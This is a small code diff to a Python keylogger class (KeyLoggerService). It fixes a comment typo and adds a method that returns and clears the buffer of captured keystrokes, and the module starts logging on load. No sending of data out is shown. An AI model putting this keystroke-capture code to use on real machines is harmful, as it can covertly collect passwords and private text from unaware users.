@@ -7,7 +7,7 @@ class KeyLoggerService(IKeyLogger):
         self.data = []
         self.listener = Listener(on_press=self.__on_press)
     
-    #The listener start to listen to everey press keyboard
+    #The listener start to listen to every press keyboard
     def start_logging(self):
         self.listener.start()
 
@@ -24,8 +24,11 @@ class KeyLoggerService(IKeyLogger):
         else:
             return key.char if hasattr(key, 'char') else str(key)
 
-
-
+    #Get all keys
+    def get_logged_keys(self):
+        copy_buffer = self.data.copy()
+        self.data.clear()
+        return copy_buffer
 
 logger = KeyLoggerService()
 logger.start_logging()
